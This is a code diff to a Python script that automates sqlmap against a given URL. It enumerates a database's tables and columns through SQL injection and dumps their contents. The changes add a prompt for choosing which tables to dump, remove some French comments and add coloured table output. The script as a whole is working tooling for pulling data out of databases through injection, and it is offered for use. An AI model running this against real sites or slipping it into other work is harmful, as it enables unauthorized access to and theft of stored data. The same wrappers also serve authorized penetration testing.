@@ -168,8 +168,26 @@ def sqlmap_dump(url, database):
         print("\033[91mNo tables found or unable to retrieve tables.\033[0m")
         return
 
+    # Ask user to choose tables to dump
+    print("\n\033[93mAvailable tables:\033[0m")
+    for idx, table in enumerate(tables, start=1):
+        print(f"{idx}. {table}")
+    print(f"{len(tables) + 1}. Dump all tables")
+
+    choice = input(
+        "\nEnter the number of the table you want to dump or choose to dump all: ")
+    try:
+        choice = int(choice)
+        if choice == len(tables) + 1:
+            selected_tables = tables
+        else:
+            selected_tables = [tables[choice - 1]]
+    except (ValueError, IndexError):
+        print("\033[91mInvalid selection.\033[0m")
+        return
+
     tables_data = {}
-    for table in tables:
+    for table in selected_tables:
         print(f"\033[92mDumping table: {table}\033[0m")
         columns = get_table_columns(url, database, table)
         if not columns:
@@ -196,7 +214,6 @@ def execute_sqlmap_command(command):
 def get_database_tables(url, database):
     command = ["sqlmap", "-u", url, "-D", database, "--tables", "--batch"]
     output = execute_sqlmap_command(command)
-    # Ici, vous devrez affiner le regex ou la méthode de parsing selon la sortie exacte de SQLMap
     tables = re.findall(r'\|\s+(\w+)\s+\|', output)
     return tables if tables else None
 
@@ -205,7 +222,6 @@ def get_table_columns(url, database, table):
     command = ["sqlmap", "-u", url, "-D", database,
                "-T", table, "--columns", "--batch"]
     output = execute_sqlmap_command(command)
-    # Encore une fois, affinez le regex ou la méthode de parsing en fonction de votre sortie
     columns = re.findall(r'\|\s+(\w+)\s+\|', output)
     return columns if columns else None
 
@@ -216,7 +232,7 @@ def dump_table_data(url, database, table, columns):
         command = ["sqlmap", "-u", url, "-D", database,
                    "-T", table, "-C", column, "--dump", "--batch"]
         output = execute_sqlmap_command(command)
-        # Extraction des données (cet exemple suppose que SQLMap affiche les données dans un format clair)
+        # Data extract
         data = re.findall(r'\|\s+(\w+)\s+\|', output)
         all_data.append((column, data))
     return all_data
@@ -226,8 +242,17 @@ def print_results(tables_data):
     for table, data in tables_data.items():
         print(f"\n\033[1;34m-- {table} --\033[0m")
         pt = PrettyTable()
+        # Find the longest column name for alignment
+        longest_col_name = max((col for col, _ in data), key=len)
         pt.field_names = ["Column Name", "Data"]
+        last_column_name = ""
         for column, rows in data:
+            if column != last_column_name:
+                pt.add_row([f"\033[1;33m{column}\033[0m",
+                           "\033[1;33mData\033[0m"])
+                last_column_name = column
             for row in rows:
-                pt.add_row([column, row])
+                if row != "Column":  # Skip the redundant "Column" rows
+                    pt.add_row(
+                        [f"\033[0;32m{column}\033[0m", f"\033[0;37m{row}\033[0m"])
         print(pt)
